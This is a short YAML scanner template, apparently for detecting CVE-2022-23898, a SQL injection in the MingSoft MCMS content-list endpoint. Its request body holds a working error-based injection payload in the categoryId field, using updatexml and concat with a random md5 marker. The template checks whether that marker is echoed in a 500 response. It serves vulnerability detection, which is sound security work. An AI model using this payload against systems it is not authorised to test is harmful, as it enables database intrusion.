name: yaml-poc-mingsoft-mcms-sql_injection-CVE-2022-23898
binding: 97a7ace4-396e-43ca-8e80-391ed81f5127
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-23898/
        - https://github.com/ming-soft/MCMS/issues/62
        - https://nvd.nist.gov/vuln/detail/CVE-2022-23898
    vulnerability:
        id: 29c103cf-46a4-47cf-8897-c460cb6c4841
        level: critical
    warning: Harmless
transport: http
set:
    num: randomInt(1000000, 999999999)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /cms/content/list
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: categoryId=1' and updatexml(1,concat(0x7e,md5("{{num}}"),0x7e),1) and 'zzz'='zzz
            follow_redirects: false
        expression: response.status == 500 && response.body_string.contains(substr(md5(string(num)), 2, 28))
expression: r0()
